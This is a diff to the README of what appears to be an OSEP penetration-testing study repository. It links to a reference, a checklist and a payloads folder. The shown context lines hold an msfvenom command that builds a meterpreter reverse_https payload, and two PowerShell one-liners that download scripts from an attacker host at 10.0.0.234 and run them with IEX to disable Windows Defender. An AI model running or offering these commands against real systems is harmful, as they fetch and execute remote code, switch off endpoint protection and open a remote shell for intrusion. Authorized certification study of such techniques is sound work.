@@ -9,7 +9,6 @@ Thank you, to everyone who's code was used in this repository.
 
 
 # Table of Contents
-
 - [OSEP_Reference](https://github.com/In3x0rabl3/OSEP/blob/main/osep_reference.md)
 - [OSEP_Checklist](https://github.com/In3x0rabl3/OSEP/blob/main/osep_checklistv2.md)
 - [OSEP_Payloads](https://github.com/In3x0rabl3/OSEP/tree/main/Payloads)
@@ -33,4 +32,8 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.234 LPORT=443 -f 
 (New-Object Net.WebClient).DownloadString('http://10.0.0.234:8000/bypass_defender/DefendersDeath.ps1') | IEX;
 (New-Object Net.WebClient).DownloadString('http://10.0.0.234:8000/bypass_defender/DisableDefender.ps1') | IEX;
 + (need administrator priviledge)
+```
+
+# 
+```
 ```
